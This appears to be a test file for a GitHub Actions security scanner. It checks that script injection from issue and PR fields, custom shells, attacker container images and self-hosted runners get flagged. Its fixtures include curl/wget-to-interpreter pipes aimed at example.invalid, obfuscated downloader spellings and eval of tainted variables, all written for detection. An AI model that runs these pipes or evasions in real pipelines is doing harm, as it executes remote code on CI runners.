'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {attestCi}=require('./ultra_sentinel_frontier_integrity.cjs');
const SHA='a'.repeat(40),REPO='cardenaspiero255-lang/gamehub-ultra';
const TRUST={'Android build':{id:11,path:'.github/workflows/android.yml'},
 'Unit Test Coverage':{id:12,path:'.github/workflows/coverage.yml'}};
function workflow(event,expr,githubScript=false){
 const head=['on: '+event,'jobs:','  verify:','    runs-on: ubuntu-latest','    steps:'];
 const script=githubScript?['      - uses: actions/github-script@'+SHA,'        with:',
  '          script: core.info("'+expr+'")']:['      - run: echo "'+expr+'"'];
 return [...head,...script].join('\n');
}
function run(name,overrides={}){
 const isAndroid=name==='Android build',id=isAndroid?101:201;
 return {id,run_number:7,run_attempt:1,name,head_sha:SHA,
  event:'pull_request',head_branch:'feature/test',status:'completed',conclusion:'success',
  workflow_id:isAndroid?11:12,
  path:isAndroid?'.github/workflows/android.yml':'.github/workflows/coverage.yml',
  repository:{full_name:REPO},head_repository:{full_name:REPO},...overrides};
}
function ci(runs){return attestCi({sha:SHA,repo:REPO,runs,apiComplete:true,
 trustedWorkflows:TRUST,changedFiles:[],changedFilesComplete:true})}
test('ROOT-1: every untrusted event data shape in privileged executable code is BLOCKER or INCOMPLETE',()=>{
 const expressions=[
  '${{ github.event.issue }}',
  '${{ github.event.issue.title }}',
  '${{ github.event.issue.user.login }}',
  '${{ github.event.issue.assignee.login }}',
  '${{ github.event.issue.labels.*.name }}',
  '${{ github.event.issue.* }}',
  '${{ github.event.issue["title"] }}',
  '${{ github.event.issue[format("body")] }}',
  '${{ toJSON(github.event.issue) }}',
  '${{ toJSON(github.event.issue.*) }}',
  '${{ fromJSON(toJSON(github.event.issue)).title }}',
  '${{ join(github.event.issue.labels.*.name, ",") }}',
  '${{ format("{0}",github.event.issue.title) }}',
  '${{ github.event.client_payload.deep.item.title }}',
  '${{ github.event.release.author.login }}',
  '${{ github.event.workflow_run.display_title }}',
  '${{ github.event.sender.login }}',
  '${{ github.head_ref }}',
  '${{ inputs.somevalue }}',
  '${{ github.ref }}',
  '${{ steps.read.outputs.issue_title }}'
 ];
 for(const executor of [false,true]){
  for(const expr of expressions){
   const w=workflow('issues',expr,executor);
   const result=inspectWorkflow(w);
   assert.notEqual(result.status,'NO_RISK_PATTERN',JSON.stringify({expr,executor,result}));
   assert.ok(result.status==='INCOMPLETE'||result.findings.some(f=>f.severity==='BLOCKER'),
    JSON.stringify({expr,executor,result}));
  }
 }
});
test('ROOT-1: safe fixed GitHub scalars remain clean on privileged scripts',()=>{
 const expressions=[
  '${{ github.sha }}','${{ github.run_id }}','${{ github.run_attempt }}',
  '${{ github.event.issue.number }}','${{ github.event.pull_request.number }}',
  '${{ github.event_name }}','${{ toJSON(github.event.issue.number) }}'
 ];
 for(const executor of [false,true])for(const expr of expressions){
  const result=inspectWorkflow(workflow('issues',expr,executor));
  assert.equal(result.status,'NO_RISK_PATTERN',JSON.stringify({expr,executor,result}));
 }
});
test('ROOT-1: complete expression coverage for long, malformed and nested strings',()=>{
 for(const expr of [
  '${{ format("'+'x'.repeat(1200)+'{0}", github.event.issue.title) }}',
  '${{ github.event.issue.title ',
  '${{ github.event.issue.title }} ${{',
  '${{ github.event.issue["title"] }}',
  '${{ format("{0}",github.event.issue.body) }}'
 ])for(const executor of [false,true]){
  const result=inspectWorkflow(workflow('issues',expr,executor));
  assert.notEqual(result.status,'NO_RISK_PATTERN',JSON.stringify({expr:expr.slice(0,80),executor,result}));
 }
});
test('ROOT-2: unorderable or untrusted records cannot let older Android green pass',()=>{
 const green=run('Android build',{id:100,run_number:7,run_attempt:1});
 const coverage=run('Unit Test Coverage');
 for(const bad of [
  {id:102,run_number:undefined,run_attempt:1},
  {id:102,run_number:8,run_attempt:undefined},
  {id:undefined,run_number:8,run_attempt:1},
  {id:102,run_number:8,run_attempt:1,workflow_id:99},
  {id:102,run_number:8,run_attempt:1,path:'.github/workflows/not-android.yml'},
  {id:102,run_number:8,run_attempt:1,event:'workflow_dispatch'},
  {id:102,run_number:8,run_attempt:1,repository:{full_name:'evil/fork'}},
  {id:102,run_number:8,run_attempt:1,head_repository:null},
  {id:102,run_number:8,run_attempt:1,status:'invalid'},
  {id:102,run_number:8,run_attempt:1,conclusion:'failure'}
 ]) {
  const result=ci([green,coverage,run('Android build',bad)]);
  assert.notEqual(result.status,'PASS',JSON.stringify({bad,result}));
 }
});
test('ROOT-2: invalid latest Coverage or contradictory duplicate metadata never passes',()=>{
 const android=run('Android build'),old=run('Unit Test Coverage',{id:200,run_number:7});
 for(const bad of [
  {id:202,run_number:8,run_attempt:undefined},
  {id:202,run_number:8,run_attempt:1,status:'in_progress',conclusion:null},
  {id:200,run_number:7,run_attempt:1,conclusion:'failure'},
  {id:202,run_number:8,run_attempt:1,workflow_id:999}
 ]){
  const result=ci([android,old,run('Unit Test Coverage',bad)]);
  assert.notEqual(result.status,'PASS',JSON.stringify({bad,result}));
 }
});
test('ROOT-2: out-of-order fresh green and stale red uses newest verified attempt',()=>{
 const android=run('Android build');
 const coverage=run('Unit Test Coverage');
 const result=ci([run('Android build',{id:99,run_number:6,conclusion:'failure'}),
   coverage,android]);
 assert.equal(result.status,'PASS',JSON.stringify(result));
});


test('ROOT-3: privileged step shell is executable and cannot use attacker issue text',()=>{
 for(const expr of ['${{ github.event.issue.title }}',
  '${{ format("bash -c {0} -- {1}", github.event.issue.body, 0) }}']){
  const source=['on: issues','jobs:','  audit:','    steps:',
   '      - run: echo safe','        shell: '+expr].join('\\n').replaceAll('\\n','\n');
  const result=inspectWorkflow(source);
  assert.ok(result.status==='INCOMPLETE'||result.findings.some(f=>f.severity==='BLOCKER'),JSON.stringify({expr,result}));
  assert.notEqual(result.status,'NO_RISK_PATTERN');
 }
});
test('ROOT-3: unknown shell template is inconclusive, literal standard shell remains accepted',()=>{
 for(const shell of ['${{ matrix.shell }}','${{ steps.selector.outputs.shell }}']){
  const source=['on: issues','jobs:','  audit:','    steps:',
   '      - run: echo safe','        shell: '+shell].join('\n');
  const result=inspectWorkflow(source);
  assert.equal(result.status,'INCOMPLETE',JSON.stringify({shell,result}));
 }
 const good=['on: issues','jobs:','  audit:','    steps:',
  '      - run: echo safe','        shell: bash'].join('\n');
 assert.equal(inspectWorkflow(good).status,'NO_RISK_PATTERN');
});
test('ROOT-3: uninspectable shell defaults and nonstring shell cannot be verified cleanly',()=>{
 for(const src of [
  ['on: issues','defaults:','  run:','    shell: ${{ inputs.shell }}',
   'jobs:','  audit:','    steps:','      - run: echo safe'].join('\n'),
  ['on: issues','jobs:','  audit:','    defaults:','      run:',
   '        shell: ${{ inputs.shell }}','    steps:','      - run: echo safe'].join('\n'),
  ['on: issues','jobs:','  audit:','    steps:',
   '      - run: echo safe','        shell: [bash]'].join('\n')
 ]){
  const result=inspectWorkflow(src);
  assert.equal(result.status,'INCOMPLETE',JSON.stringify(result));
 }
});
test('ROOT-1: delimiters in quoted expression literals do not suppress attacker input',()=>{
 for(const expr of [
  "\${{ format('x}}{0}', github.event.issue.title) }}",
  "\${{ format('a''}}b{0}',github.event.issue.body) }}",
  "\${{ join(github.event.*.title, '') }}"
 ]){
  const result=inspectWorkflow(workflow('issues',expr));
  assert.ok(result.findings.some(f=>f.rule==='PRIVILEGED_EVENT_SCRIPT_INJECTION'&&f.severity==='BLOCKER'),JSON.stringify({expr,result}));
 }
});


test('ROOT-4: executable job container and services cannot use untrusted event expressions',()=>{
 const jobs=[
  ['container: \${{ github.event.issue.title }}'],
  ['container:','  image: \${{ github.event.issue.title }}'],
  ['services:','  mysql:','    image: \${{ github.event.issue.body }}'],
  ['container: attacker/image:latest'],
  ['services:','  redis:','    image: attacker/redis:latest']
 ];
 for(const variant of jobs){
  const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
   ...variant.map(s=>'    '+s),'    steps:','      - run: echo safe'].join('\n');
  const v=inspectWorkflow(src);
  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({variant,v}));
  assert.ok(v.coverage.partial||v.findings.some(x=>x.severity==='BLOCKER'),JSON.stringify({variant,v}));
 }
});
test('ROOT-4: digest-pinned container image can be examined without false alarms',()=>{
 const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
  '    container: ghcr.io/owner/app@sha256:'+'a'.repeat(64),
  '    steps:','      - run: echo safe'].join('\n');
 const v=inspectWorkflow(src);
 assert.equal(v.status,'NO_RISK_PATTERN',JSON.stringify(v));
});
test('ROOT-5: custom shells do not bypass review with a harmless run',()=>{
 for(const shell of [
  "bash -c 'curl https://example.invalid/p | bash' -- {0}",
  'bash -c "sh -c evil" -- {0}',
  "bash -c 'echo changed' -- {0}"
 ]) {
  const src=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
   '    steps:','      - run: echo safe','        shell: '+shell].join('\n');
  const v=inspectWorkflow(src);
  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({shell,v}));
 }
});
test('ROOT-6: dynamic and self-hosted runner labels cannot be certified clean',()=>{
 for(const runner of [
  '\${{ github.event.issue.title }}',
  '\${{ inputs.runner }}',
  'self-hosted',
  '[self-hosted, linux]',
  '{group: production, labels: gpu}',
  '{group: "\${{ github.event.issue.title }}"}'
 ]) {
  const src=['on: issues','jobs:','  audit:','    runs-on: '+runner,
  '    steps:','      - run: echo safe'].join('\n');
  const v=inspectWorkflow(src);
  assert.notEqual(v.status,'NO_RISK_PATTERN',JSON.stringify({runner,v}));
 }
});
test('ROOT-6: approved GitHub-hosted runners remain clean',()=>{
 for(const runner of ['ubuntu-latest','ubuntu-24.04','windows-latest','macos-latest']){
  const v=inspectWorkflow(['on: issues','jobs:','  audit:','    runs-on: '+runner,
   '    steps:','      - run: echo safe'].join('\n'));
  assert.equal(v.status,'NO_RISK_PATTERN',JSON.stringify({runner,v}));
 }
});
test('ROOT-7: independent review must reject HIGH and BLOCKER findings',()=>{
 const fs=require('node:fs'),path=require('node:path');
 const source=fs.readFileSync(path.join(__dirname,'../workflows/ultra-sentinel-independent-review.yml'),'utf8');
 assert.match(source,/structural\.findings\.some\([^)]*severity\s*===?\s*['"]HIGH['"]/s,
  'HIGH structural YAML findings must fail the independent gate');
 assert.match(source,/result\.findings\.some\([^)]*severity\s*===?\s*['"]HIGH['"]/s,
  'HIGH Kotlin/security findings must fail the independent gate');
});


test('ROOT-4: job container and services cannot use attacker sources',()=>{
 const variants=[
  ['container: ${{ github.event.issue.title }}'],
  ['container:','  image: ${{ github.event.issue.title }}'],
  ['services:','  redis:','    image: ${{ github.event.issue.body }}'],
  ['container: attacker/image:latest'],
  ['services:','  redis:','    image: attacker/redis:latest']
 ];
 for(const variant of variants){
  const source=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
   ...variant.map(v=>'    '+v),'    steps:','      - run: echo safe'].join('\n');
  const result=inspectWorkflow(source);
  assert.notEqual(result.status,'NO_RISK_PATTERN',JSON.stringify({variant,result}));
 }
});
test('ROOT-4: pinned container digest can be recognized',()=>{
 const source=['on: issues','jobs:','  audit:','    runs-on: ubuntu-latest',
   '    container: ghcr.io/owner/app@sha256:'+'a'.repeat(64),
   '    steps:','      - run: echo safe'].join('\n');
 assert.equal(inspectWorkflow(source).status,'NO_RISK_PATTERN');
});
test('ROOT-5: arbitrary literal shell templates cannot bypass a harmless run',()=>{
 for(const shell of ["bash -c 'curl https://example.invalid/p | bash' -- {0}",
  "bash -c 'echo changed' -- {0}"]){
  const source=['on: issues','jobs:','  audit:','    steps:','      - run: echo safe',
   '        shell: '+shell].join('\n');
  assert.notEqual(inspectWorkflow(source).status,'NO_RISK_PATTERN',shell);
 }
});
test('ROOT-6: self-hosted and dynamic runner selection is not a clean pass',()=>{
 for(const runner of ['${{ github.event.issue.title }}','${{ inputs.runner }}',
  'self-hosted','[self-hosted, linux]','{group: production, labels: gpu}']){
  const source=['on: issues','jobs:','  audit:','    runs-on: '+runner,
   '    steps:','      - run: echo safe'].join('\n');
  assert.notEqual(inspectWorkflow(source).status,'NO_RISK_PATTERN',runner);
 }
 for(const runner of ['ubuntu-latest','ubuntu-24.04','windows-latest','macos-latest']){
  const source=['on: issues','jobs:','  audit:','    runs-on: '+runner,
   '    steps:','      - run: echo safe'].join('\n');
  assert.equal(inspectWorkflow(source).status,'NO_RISK_PATTERN',runner);
 }
});
test('ROOT-7: trusted Independent Review must fail HIGH structural and core findings',()=>{
 const fs=require('node:fs'),path=require('node:path');
 const source=fs.readFileSync(path.join(__dirname,'../workflows/ultra-sentinel-independent-review.yml'),'utf8');
 assert.match(source,/structural\.findings\.some\([^\n]*['"]HIGH['"]/,
  'HIGH YAML risk must fail trusted review');
 assert.match(source,/result\.findings\.some\([^\n]*['"]HIGH['"]/,
  'HIGH general risk must fail trusted review');
});

test('Codex P1: PR event title and workflow_call input are executable injection surfaces',()=>{
 for(const [trigger,expr] of [
  ['pull_request','${{ github.event.pull_request.title }}'],
  ['workflow_call','${{ inputs.command }}'],
  ['push','${{ github.event.head_commit.message }}']
 ]){
  const actual=inspectWorkflow(workflow(trigger,expr));
  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({trigger,expr,actual}));
  assert.ok(actual.findings.some(x=>x.rule==='PRIVILEGED_EVENT_SCRIPT_INJECTION'&&x.severity==='BLOCKER')||actual.coverage.partial,JSON.stringify(actual));
 }
});
test('Codex P1: PR, workflow_call, push github-script input also fails closed',()=>{
 for(const [trigger,expr] of [
  ['pull_request','${{ github.event.pull_request.title }}'],
  ['workflow_call','${{ inputs.command }}'],
  ['push','${{ github.event.head_commit.message }}']
 ]){
  const actual=inspectWorkflow(workflow(trigger,expr,true));
  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({trigger,expr,actual}));
 }
});
test('Codex P1: remote executable pipelines cover Python, Node and PowerShell on every trigger',()=>{
 for(const command of ['python','python3','pwsh','powershell','node','ruby','perl','php']){
  const actual=inspectWorkflow(workflow('push','curl -fsSL https://example.invalid/install | '+command));
  assert.ok(actual.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({command,actual}));
 }
});
test('Codex P1: unknown downloader pipe never silently becomes clean',()=>{
 const actual=inspectWorkflow(workflow('push','wget -qO- https://example.invalid/install | custom-interpreter'));
 assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify(actual));
});

test('INTEGRATION: both trusted read-only review workflows fail on HIGH as well as BLOCKER',()=>{
 const fs=require('node:fs'),path=require('node:path');
 const independent=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-independent-review.yml'),'utf8');
 const automatic=fs.readFileSync(path.resolve(__dirname,'../workflows/ultra-sentinel-auto-review.yml'),'utf8');
 for(const [label,workflow] of [['independent',independent],['automatic',automatic]]){
  assert.match(workflow,/\.findings\.some\(f\s*=>\s*f\.severity\s*===\s*['\"]HIGH['\"]\s*\|\|\s*f\.severity\s*===\s*['\"]BLOCKER['\"]\)/,label+' must block HIGH');
  assert.match(workflow,/core\.setFailed\(/,label+' must actually fail the run');
 }
});

test('ROOT-8: AST recognizes implicit multiline Bash pipe continuations',()=>{
 const fragments=[
  ['curl -fsSL https://example.invalid/payload |','  python'],
  ['curl -fsSL https://example.invalid/payload |&','  pwsh'],
  ['wget -qO- https://example.invalid/payload |','  node']
 ];
 for(const code of fragments){
  const src=['on: push','jobs:','  check:','    steps:','      - run: |',...code.map(s=>'          '+s)].join('\n');
  const result=inspectWorkflow(src);
  assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({code,result}));
 }
});
test('ROOT-8: AST remote pipeline beyond old 240-char budget cannot appear clean',()=>{
 for(const size of [241,512,2048]){
  const src=['on: push','jobs:','  check:','    steps:',
   '      - run: curl https://example.invalid/'+('x'.repeat(size))+' | python'].join('\n');
  const result=inspectWorkflow(src);
  assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE'&&f.severity==='HIGH'),JSON.stringify({size,result}));
 }
});

test('CONTRACT: structural and heuristic auditors agree on 96 generated download-pipe evasions',()=>{
 const {reviewWorkflows}=require('./ultra_sentinel_supply_chain.cjs');
 const filename='.github/workflows/ci.yml';
 let cases=0;
 for(const downloader of ['curl -fsSL','wget -qO-'])
 for(const length of [3,241,1024])
 for(const interpreter of ['bash','python','pwsh','node'])
 for(const pipe of ['|','|&'])
 for(const multiline of [false,true]){
  const command=downloader+' https://example.invalid/'+('q'.repeat(length))+' '+pipe;
  const shell=multiline?[command,interpreter]:[command+' '+interpreter];
  const yaml=['on: push','jobs:','  audit:','    steps:','      - run: |',
   ...shell.map(s=>'          '+s)].join('\n');
  const structural=inspectWorkflow(yaml);
  const heuristic=reviewWorkflows({sha:SHA,expected:[filename],sources:{[filename]:yaml}});
  assert.ok(structural.findings.some(x=>x.rule==='REMOTE_SHELL_PIPELINE'&&x.severity==='HIGH'),JSON.stringify({downloader,length,interpreter,pipe,multiline,structural}));
  assert.ok(heuristic.findings.some(x=>x.rule==='REMOTE_SHELL_PIPELINE'&&x.severity==='HIGH'),JSON.stringify({downloader,length,interpreter,pipe,multiline,heuristic}));
  cases++;
 }
 assert.equal(cases,96);
});

test('Codex P1: reusable workflow cannot pass attacker-controlled ref without review',()=>{
 const source=['on: pull_request_target','jobs:','  caller:',
 '    uses: ./.github/workflows/reusable.yml','    with:',
 '      ref: ${{ github.event.pull_request.head.sha }}'].join('\n');
 const actual=inspectWorkflow(source);
 assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify(actual));
 assert.ok(actual.coverage.partial||actual.findings.some(x=>x.severity==='BLOCKER'),JSON.stringify(actual));
});
test('Codex P1: untrusted event env values never become a clean executable workflow',()=>{
 const layouts=[
 ['env:','  CMD: ${{ github.event.issue.title }}','jobs:','  audit:'],
 ['jobs:','  audit:','    env:','      CMD: ${{ github.event.issue.title }}'],
 ['jobs:','  audit:','    steps:','      - run: $CMD','        env:','          CMD: ${{ github.event.issue.title }}']
 ];
 for(let i=0;i<layouts.length;i++){
  const src=i===0?['on: issues',...layouts[i],'    steps:','      - run: $CMD'].join('\n'):
   i===1?['on: issues',...layouts[i],'    steps:','      - run: $CMD'].join('\n'):
   ['on: issues',...layouts[i]].join('\n');
  const actual=inspectWorkflow(src);
  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({i,actual}));
 }
});
test('Codex P1: escaped downloader spellings cannot hide a remote pipe from AST',()=>{
 for(const downloader of ['c\\url','w\\get']){
  const src=['on: push','jobs:','  audit:','    steps:',
  '      - run: '+downloader+' https://example.invalid/payload | bash'].join('\n');
  const actual=inspectWorkflow(src);
  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({downloader,actual}));
 }
});

test('Codex P1: Bash parameter expansions of tainted env never escape auditing',()=>{
 const expansions=['${CMD:-safe}','${CMD-safe}','${CMD:=safe}','${CMD:+safe}',
  '${CMD:0:3}','${!CMD}'];
 for(const word of expansions){
  const yaml=['on: issues','env:','  CMD: ${{ github.event.issue.title }}',
   'jobs:','  audit:','    steps:','      - run: eval '+word].join('\n');
  const actual=inspectWorkflow(yaml);
  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({word,actual}));
  assert.ok(actual.findings.some(f=>f.severity==='BLOCKER')||actual.coverage.partial,JSON.stringify({word,actual}));
 }
});
test('Codex P1: shell concatenated quoted downloader names never certify clean',()=>{
 const downloaders=["c''url",'"c"url',"c'u'rl","w''get",'"w"get'];
 for(const downloader of downloaders){
  const yaml=['on: push','jobs:','  audit:','    steps:',
   '      - run: '+downloader+' https://example.invalid/script | bash'].join('\n');
  const result=inspectWorkflow(yaml);
  assert.notEqual(result.status,'NO_RISK_PATTERN',JSON.stringify({downloader,result}));
  assert.ok(result.findings.some(f=>f.rule==='REMOTE_SHELL_PIPELINE')||result.coverage.partial,JSON.stringify({downloader,result}));
 }
});
